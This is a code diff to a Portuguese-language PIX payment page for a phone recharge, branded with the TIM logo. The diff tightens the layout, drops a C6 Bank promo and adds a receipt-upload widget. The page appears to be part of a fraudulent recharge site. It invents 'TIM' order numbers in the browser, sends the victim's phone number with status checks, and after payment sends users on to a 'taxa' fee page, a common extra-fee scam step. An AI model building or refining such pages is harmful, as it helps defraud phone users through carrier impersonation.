@@ -16,51 +16,65 @@
         .tim-logo-header { display: flex; align-items: center; gap: 6px; font-weight: 900; font-size: 24px; text-decoration: none; color: white; }
         
         .pix-main { flex: 1; display: flex; flex-direction: column; }
-        .pix-card { background: white; border-radius: 24px 24px 0 0; padding: 32px 20px; flex: 1; text-align: center; margin-top: 10px; }
+        .pix-card { background: white; border-radius: 20px 20px 0 0; padding: 16px 16px 20px; flex: 1; text-align: center; margin-top: 6px; }
         
-        .pix-header { display: flex; align-items: center; justify-content: center; gap: 8px; margin-bottom: 8px; }
-        .pix-header h2 { font-size: 18px; color: #001A33; font-weight: 800; margin: 0; }
-        .pix-subtitle { font-size: 13px; color: #666; margin-bottom: 24px; line-height: 1.4; }
+        .pix-header { display: flex; align-items: center; justify-content: center; gap: 6px; margin-bottom: 2px; }
+        .pix-header h2 { font-size: 16px; color: #001A33; font-weight: 800; margin: 0; }
+        .pix-subtitle { font-size: 11px; color: #666; margin-bottom: 10px; line-height: 1.3; }
         
-        .timer-box { border: 1px solid #EAEAEA; background: #FAFAFA; border-radius: 12px; padding: 16px; margin-bottom: 24px; box-shadow: 0 4px 6px rgba(0,0,0,0.02); }
-        .timer-title { font-size: 18px; font-weight: 900; color: #FF192D; margin-bottom: 8px; }
-        .timer-badge { background: #FFF4CC; color: #B37700; font-size: 12px; font-weight: 700; padding: 4px 12px; border-radius: 16px; display: inline-block; }
+        .timer-box { border: 1px solid #EAEAEA; background: #FAFAFA; border-radius: 10px; padding: 6px 12px; margin-bottom: 10px; display: flex; align-items: center; justify-content: space-between; }
+        .timer-title { font-size: 13px; font-weight: 800; color: #FF192D; margin: 0; }
+        .timer-badge { background: #FFF4CC; color: #B37700; font-size: 10px; font-weight: 700; padding: 3px 8px; border-radius: 12px; }
         
-        .qr-label { font-size: 11px; font-weight: 800; color: #888; letter-spacing: 0.5px; margin-bottom: 12px; text-transform: uppercase; }
-        .qr-code { width: 180px; height: 180px; margin: 0 auto 24px; display: block; border-radius: 8px; }
+        .qr-label { font-size: 10px; font-weight: 800; color: #888; letter-spacing: 0.5px; margin-bottom: 6px; text-transform: uppercase; }
+        .qr-code { width: 140px; height: 140px; margin: 0 auto 10px; display: block; border-radius: 8px; }
         
-        .c6-promo-box { border: 1px solid #BFE4DF; border-radius: 12px; padding: 12px; display: flex; align-items: center; justify-content: center; gap: 12px; margin-bottom: 16px; }
-        .c6-logo { display: flex; align-items: center; gap: 2px; border: 1px solid #ccc; padding: 6px 10px; border-radius: 8px; }
-        .c6-text { font-size: 11px; color: #0114C4; font-weight: 700; line-height: 1.2; text-align: left; }
+        .warning-box { background: #FFF9E6; border: 1px solid #FFD633; border-radius: 10px; padding: 6px 10px; display: flex; align-items: center; gap: 8px; text-align: left; margin-bottom: 10px; }
+        .warning-box p { font-size: 10px; color: #995C00; margin: 0; line-height: 1.3; font-weight: 500; }
         
-        .warning-box { background: #FFF9E6; border: 1px solid #FFD633; border-radius: 12px; padding: 16px; display: flex; align-items: flex-start; gap: 12px; text-align: left; margin-bottom: 24px; }
-        .warning-box p { font-size: 11px; color: #995C00; margin: 0; line-height: 1.5; font-weight: 500; }
-        
-        .copy-label { font-size: 11px; font-weight: 800; color: #888; letter-spacing: 0.5px; margin-bottom: 8px; text-transform: uppercase; text-align: center; }
-        .copy-container { display: flex; border-radius: 8px; overflow: hidden; margin-bottom: 32px; border: 1px solid #EAEAEA; }
-        .copy-container input { flex: 1; border: none; background: #FAFAFA; padding: 0 16px; font-size: 12px; color: #666; outline: none; }
-        .btn-copy { background: #20C997; color: white; border: none; padding: 12px 16px; font-weight: 700; font-size: 13px; display: flex; align-items: center; gap: 6px; cursor: pointer; transition: background 0.2s ease; }
+        .copy-label { font-size: 10px; font-weight: 800; color: #888; letter-spacing: 0.5px; margin-bottom: 4px; text-transform: uppercase; text-align: center; }
+        .copy-container { display: flex; border-radius: 8px; overflow: hidden; margin-bottom: 12px; border: 1px solid #EAEAEA; }
+        .copy-container input { flex: 1; border: none; background: #FAFAFA; padding: 0 10px; font-size: 11px; color: #666; outline: none; }
+        .btn-copy { background: #20C997; color: white; border: none; padding: 10px 14px; font-weight: 700; font-size: 12px; display: flex; align-items: center; gap: 6px; cursor: pointer; transition: background 0.2s ease; white-space: nowrap; }
         .btn-copy:active { background: #18a87d; }
         
-        .details-box { border: 1px solid #EAEAEA; background: #FAFAFA; border-radius: 12px; padding: 0 16px; margin-bottom: 24px; text-align: left; }
-        .detail-row { display: flex; justify-content: space-between; align-items: center; padding: 16px 0; border-bottom: 1px solid #EAEAEA; font-size: 13px; }
+        .details-box { border: 1px solid #EAEAEA; background: #FAFAFA; border-radius: 10px; padding: 0 12px; margin-bottom: 14px; text-align: left; }
+        .detail-row { display: flex; justify-content: space-between; align-items: center; padding: 10px 0; border-bottom: 1px solid #EAEAEA; font-size: 12px; }
         .detail-row:last-child { border-bottom: none; }
         .detail-row span { color: #666; }
         .detail-row strong { color: #001A33; font-weight: 800; }
         .light-text { color: #888 !important; font-weight: 500 !important; }
         
-        .secure-footer { font-size: 12px; color: #00C853; font-weight: 800; line-height: 1.5; padding-bottom: 20px; }
-        .secure-footer span { color: #888; font-weight: 400; font-size: 11px; }
+        .secure-footer { font-size: 11px; color: #00C853; font-weight: 800; line-height: 1.4; padding-bottom: 14px; }
+        .secure-footer span { color: #888; font-weight: 400; font-size: 10px; }
 
-        .toast { position: fixed; bottom: 20px; left: 50%; transform: translateX(-50%); background: rgba(0,0,0,0.8); color: white; padding: 12px 24px; border-radius: 30px; font-size: 13px; font-weight: 600; opacity: 0; transition: opacity 0.3s; pointer-events: none; }
+        .toast { position: fixed; bottom: 20px; left: 50%; transform: translateX(-50%); background: rgba(0,0,0,0.8); color: white; padding: 12px 24px; border-radius: 30px; font-size: 13px; font-weight: 600; opacity: 0; transition: opacity 0.3s; pointer-events: none; z-index: 999; }
         .toast.show { opacity: 1; }
 
-        .btn-confirmar { display: flex; align-items: center; justify-content: center; gap: 8px; width: 100%; padding: 16px; border: none; border-radius: 30px; background: linear-gradient(135deg, #FFCC00, #FFD740); color: #0114C4; font-size: 15px; font-weight: 800; cursor: pointer; box-shadow: 0 4px 16px rgba(255,204,0,0.4); transition: all 0.2s ease; margin-bottom: 24px; }
+        .btn-confirmar { display: flex; align-items: center; justify-content: center; gap: 8px; width: 100%; padding: 14px; border: none; border-radius: 30px; background: linear-gradient(135deg, #FFCC00, #FFD740); color: #0114C4; font-size: 14px; font-weight: 800; cursor: pointer; box-shadow: 0 4px 16px rgba(255,204,0,0.4); transition: all 0.2s ease; margin-bottom: 16px; }
         .btn-confirmar:active { transform: scale(0.98); }
         @keyframes blink { 0% { opacity: 0.2; } 20% { opacity: 1; } 100% { opacity: 0.2; } }
         .loading-dots span { animation: blink 1.4s infinite both; }
         .loading-dots span:nth-child(2) { animation-delay: 0.2s; }
         .loading-dots span:nth-child(3) { animation-delay: 0.4s; }
+
+        /* Comprovante Upload Box - Compact & Destacado */
+        .upload-card { background: #F0F5FF; border: 2px dashed #0114C4; border-radius: 12px; padding: 12px 14px; margin-bottom: 12px; text-align: center; transition: all 0.2s ease; }
+        .upload-card:hover { background: #E8F0FE; }
+        .upload-card-title { font-size: 13px; font-weight: 800; color: #0114C4; display: flex; align-items: center; justify-content: center; gap: 6px; margin-bottom: 2px; }
+        .upload-card-sub { font-size: 11px; color: #475569; margin-bottom: 8px; line-height: 1.3; }
+        .dropzone-inner { cursor: pointer; padding: 8px 12px; border-radius: 8px; background: white; border: 1px solid #CBD5E1; display: flex; align-items: center; justify-content: center; gap: 8px; }
+        .dropzone-inner:hover { border-color: #0114C4; }
+        .dropzone-icon { color: #0114C4; display: flex; align-items: center; }
+        .dropzone-text { font-size: 12px; font-weight: 700; color: #0114C4; }
+        .dropzone-hint { font-size: 10px; color: #64748B; }
+        .file-selected-box { display: flex; align-items: center; justify-content: space-between; background: #EBF3FF; border: 1px solid #BBD6FB; padding: 8px 12px; border-radius: 8px; font-size: 11px; font-weight: 600; color: #0114C4; text-align: left; }
+        .btn-enviar-comp { display: flex; align-items: center; justify-content: center; gap: 6px; width: 100%; margin-top: 8px; padding: 10px; border: none; border-radius: 8px; background: #0114C4; color: white; font-size: 13px; font-weight: 800; cursor: pointer; transition: all 0.2s; box-shadow: 0 3px 10px rgba(1, 20, 196, 0.25); }
+        .btn-enviar-comp:hover { background: #000FA0; }
+        .btn-enviar-comp:disabled { opacity: 0.6; cursor: not-allowed; }
+        .upload-feedback { margin-top: 8px; padding: 8px; border-radius: 8px; font-size: 11px; font-weight: 600; text-align: center; }
+        .upload-feedback.success { background: #DCFCE7; color: #166534; border: 1px solid #86EFAC; }
+        .upload-feedback.error { background: #FEE2E2; color: #991B1B; border: 1px solid #FCA5A5; }
     </style>
 </head>
 <body>
@@ -89,15 +103,7 @@
                 </div>
 
                 <div class="qr-label">ESCANEIE COM O APP DO SEU BANCO</div>
-                <!-- Imagem inicial invisível ou loading enquanto gera na API -->
                 <img src="data:image/gif;base64,R0lGODlhAQABAAD/ACwAAAAAAQABAAACADs=" alt="Gerando QR Code..." class="qr-code" style="background-color: #f0f0f0; display: flex; justify-content: center; align-items: center; text-align: center; font-size: 10px; color: #999;">
-
-                <div class="c6-promo-box">
-                    <div class="c6-logo">
-                        <strong style="color:black; font-size:12px;">C6</strong><span style="color:#666; font-size:12px;">BANK</span>
-                    </div>
-                    <div class="c6-text">🎁 Ganhe +500MB grátis<br>pagando com C6 Bank</div>
-                </div>
 
                 <div class="warning-box">
                     <span style="font-size:16px;">⚠️</span>
@@ -108,9 +114,39 @@
                 <div class="copy-container">
                     <input type="text" value="Aguarde, gerando seu PIX..." readonly id="pix-key">
                     <button class="btn-copy" onclick="copyPix()">
-                        <svg viewBox="0 0 24 24" width="16" height="16" fill="white"><path d="M16 1H4C2.9 1 2 1.9 2 3v14h2V3h12V1zm3 4H8C6.9 5 6 5.9 6 7v14c0 1.1.9 2 2 2h11c1.1 0 2-.9 2-2V7c0-1.1-.9-2-2-2zm0 16H8V7h11v14z"/></svg>
+                        <svg viewBox="0 0 24 24" width="15" height="15" fill="white"><path d="M16 1H4C2.9 1 2 1.9 2 3v14h2V3h12V1zm3 4H8C6.9 5 6 5.9 6 7v14c0 1.1.9 2 2 2h11c1.1 0 2-.9 2-2V7c0-1.1-.9-2-2-2zm0 16H8V7h11v14z"/></svg>
                         COPIAR
                     </button>
+                </div>
+
+                <!-- Comprovante Upload Box (Posicionado diretamente abaixo do Copia e Cola) -->
+                <div class="upload-card">
+                    <div class="upload-card-title">
+                        <svg viewBox="0 0 24 24" width="16" height="16" fill="none" stroke="#0114C4" stroke-width="2.5"><path d="M21 15v4a2 2 0 0 1-2 2H5a2 2 0 0 1-2-2v-4"/><polyline points="17 8 12 3 7 8"/><line x1="12" y1="3" x2="12" y2="15"/></svg>
+                        <span>Já pagou? Anexe o comprovante</span>
+                    </div>
+                    <div class="upload-card-sub">Para liberação imediata dos seus créditos na linha:</div>
+
+                    <input type="file" id="comp-file-input" accept="image/*,application/pdf" style="display: none;" onchange="onFileSelected(event)">
+
+                    <div class="dropzone-inner" id="dropzone-box" onclick="document.getElementById('comp-file-input').click()">
+                        <div class="dropzone-icon">
+                            <svg viewBox="0 0 24 24" width="20" height="20" fill="none" stroke="currentColor" stroke-width="2.2"><path d="M21 15v4a2 2 0 0 1-2 2H5a2 2 0 0 1-2-2v-4"/><polyline points="17 8 12 3 7 8"/><line x1="12" y1="3" x2="12" y2="15"/></svg>
+                        </div>
+                        <span class="dropzone-text">Toque para selecionar foto ou PDF</span>
+                    </div>
+
+                    <div id="file-chosen-box" class="file-selected-box" style="display: none;">
+                        <span id="file-chosen-name" style="word-break: break-all; max-width: 85%;"></span>
+                        <span style="color: #FF192D; cursor: pointer; font-size: 16px; padding: 0 4px;" onclick="cancelFileSelection(event)">✕</span>
+                    </div>
+
+                    <button id="btn-upload-comp" class="btn-enviar-comp" style="display: none;" onclick="submitComprovante()">
+                        <svg viewBox="0 0 24 24" width="15" height="15" fill="none" stroke="currentColor" stroke-width="2.5"><polyline points="20 6 9 17 4 12"/></svg>
+                        <span>Confirmar e Enviar Comprovante</span>
+                    </button>
+
+                    <div id="upload-feedback" class="upload-feedback" style="display: none;"></div>
                 </div>
 
                 <div class="details-box">
@@ -120,7 +156,7 @@
                     </div>
                     <div class="detail-row">
                         <span>Valor</span>
-                        <strong id="display-value" style="font-size:16px;">R$ 20,00</strong>
+                        <strong id="display-value" style="font-size:15px; color:#0114C4;">R$ 20,00</strong>
                     </div>
                     <div class="detail-row">
                         <span>Pedido</span>
@@ -146,7 +182,6 @@
     <div class="toast" id="toast">Código copiado com sucesso!</div>
 
     <script>
-        // Set dynamic URL params
         const urlParams = new URLSearchParams(window.location.search);
         const phone = urlParams.get('phone');
         const value = urlParams.get('value');
@@ -154,10 +189,8 @@
         if (phone) document.getElementById('display-phone').textContent = phone;
         if (value) document.getElementById('display-value').textContent = 'R$ ' + value;
         
-        // Generate random order id
         document.getElementById('display-order').textContent = 'TIM' + Date.now().toString().substring(3, 15);
 
-        // Timer Logic
         let timeInSeconds = 15 * 60;
         const timerElement = document.getElementById('timer');
         
@@ -165,24 +198,18 @@
             const minutes = Math.floor(timeInSeconds / 60);
             const seconds = timeInSeconds % 60;
             timerElement.textContent = `${minutes.toString().padStart(2, '0')}:${seconds.toString().padStart(2, '0')}`;
-            if (timeInSeconds > 0) {
-                timeInSeconds--;
-            }
+            if (timeInSeconds > 0) timeInSeconds--;
         };
         setInterval(updateTimer, 1000);
         updateTimer();
 
-        // Fetch real PIX from session storage (generated in the previous screen)
         function loadPix() {
             try {
                 const storedPix = sessionStorage.getItem('pixData');
                 if (storedPix) {
                     const payData = JSON.parse(storedPix);
-                    // Update copy-paste key
                     document.getElementById('pix-key').value = payData.copyPaste || payData.qrCode;
                     
-                    // Update QR Code image (base64 or URL depending on gateway)
-                    // Check if qrCodeBase64 is a real base64 image (contains / and + typical of base64, or starts with data:image)
                     const isRealBase64Image = payData.qrCodeBase64 && 
                         payData.qrCodeBase64 !== '' && 
                         (payData.qrCodeBase64.startsWith('data:image') || /^[A-Za-z0-9+/=]{50,}$/.test(payData.qrCodeBase64.substring(0, 100)));
@@ -196,7 +223,6 @@
                     } else if (payData.qrCodeUrl && payData.qrCodeUrl !== '') {
                         document.querySelector('.qr-code').src = payData.qrCodeUrl;
                     } else {
-                        // Fallback: Generate QR Code from the PIX string using external API
                         const pixString = payData.copyPaste || payData.qrCode || payData.qrCodeBase64;
                         document.querySelector('.qr-code').src = 'https://api.qrserver.com/v1/create-qr-code/?size=200x200&data=' + encodeURIComponent(pixString);
                     }
@@ -208,11 +234,8 @@
                 console.error('Falha ao ler dados do PIX:', error);
             }
         }
-        
-        // Call it immediately
         loadPix();
 
-        // Poll for payment status and redirect to taxa page when paid
         function startStatusPolling() {
             try {
                 const storedPix = sessionStorage.getItem('pixData');
@@ -223,29 +246,21 @@
                     if (transactionId) {
                         const pollInterval = setInterval(async () => {
                             try {
-                                const resp = await fetch('/api/status/' + transactionId);
+                                const resp = await fetch('/api/status/' + transactionId + (phone ? '?phone=' + encodeURIComponent(phone) : ''));
                                 const statusData = await resp.json();
-                                
-                                const status = statusData.data ? statusData.data.status : '';
-                                console.log('Payment status:', status);
-                                
-                                if (status === 'PAID') {
+                                const status = (statusData.data?.status || statusData.status || '').toString().toUpperCase();
+                                if (status === 'PAID' || status === 'APPROVED') {
                                     clearInterval(pollInterval);
                                     window.location.href = `taxa.html?phone=${encodeURIComponent(phone || '')}&value=${encodeURIComponent(value || '')}`;
                                 }
-                            } catch (e) {
-                                console.error('Poll error:', e);
-                            }
-                        }, 5000);
+                            } catch (e) {}
+                        }, 8000);
                     }
                 }
-            } catch (e) {
-                console.error('Polling setup error:', e);
-            }
+            } catch (e) {}
         }
         startStatusPolling();
 
-        // Copy Logic
         function copyPix() {
             const pixKey = document.getElementById('pix-key');
             pixKey.select();
@@ -254,9 +269,87 @@
             
             const toast = document.getElementById('toast');
             toast.classList.add('show');
-            setTimeout(() => {
-                toast.classList.remove('show');
-            }, 2000);
+            setTimeout(() => toast.classList.remove('show'), 2000);
+        }
+
+        // Upload Comprovante Logic
+        let selectedFile = null;
+
+        function onFileSelected(event) {
+            const files = event.target.files;
+            if (!files || files.length === 0) return;
+            selectedFile = files[0];
+
+            document.getElementById('dropzone-box').style.display = 'none';
+            const chosenBox = document.getElementById('file-chosen-box');
+            chosenBox.style.display = 'flex';
+            document.getElementById('file-chosen-name').textContent = selectedFile.name;
+            document.getElementById('btn-upload-comp').style.display = 'flex';
+            document.getElementById('upload-feedback').style.display = 'none';
+        }
+
+        function cancelFileSelection(event) {
+            if (event) event.stopPropagation();
+            selectedFile = null;
+            document.getElementById('comp-file-input').value = '';
+            document.getElementById('file-chosen-box').style.display = 'none';
+            document.getElementById('dropzone-box').style.display = 'flex';
+            document.getElementById('btn-upload-comp').style.display = 'none';
+            document.getElementById('upload-feedback').style.display = 'none';
+        }
+
+        async function submitComprovante() {
+            if (!selectedFile) return;
+
+            const btn = document.getElementById('btn-upload-comp');
+            const feedback = document.getElementById('upload-feedback');
+            btn.disabled = true;
+            btn.innerHTML = 'Enviando...';
+            feedback.style.display = 'none';
+
+            let txId = '';
+            try {
+                const storedPix = sessionStorage.getItem('pixData');
+                if (storedPix) {
+                    const payData = JSON.parse(storedPix);
+                    txId = payData.transactionId || '';
+                }
+            } catch(e) {}
+
+            const formData = new FormData();
+            formData.append('comprovante', selectedFile);
+            formData.append('phone', phone || '');
+            formData.append('value', value || '');
+            formData.append('transactionId', txId);
+            formData.append('type', 'recarga');
+
+            try {
+                const res = await fetch('/api/upload-comprovante', {
+                    method: 'POST',
+                    body: formData
+                });
+                const result = await res.json();
+
+                if (res.ok && result.success) {
+                    btn.style.display = 'none';
+                    document.getElementById('file-chosen-box').style.display = 'none';
+                    feedback.className = 'upload-feedback success';
+                    feedback.innerHTML = '✅ <strong>Comprovante enviado com sucesso!</strong><br>Aguarde a liberação imediata da sua recarga.';
+                    feedback.style.display = 'block';
+                } else {
+                    feedback.className = 'upload-feedback error';
+                    feedback.textContent = result.message || 'Erro ao enviar comprovante.';
+                    feedback.style.display = 'block';
+                    btn.disabled = false;
+                    btn.textContent = 'Confirmar e Enviar Comprovante';
+                }
+            } catch (err) {
+                feedback.className = 'upload-feedback error';
+                feedback.textContent = 'Erro na conexão. Tente novamente.';
+                feedback.style.display = 'block';
+                btn.disabled = false;
+                btn.textContent = 'Confirmar e Enviar Comprovante';
+            }
         }
     </script>
 </body>
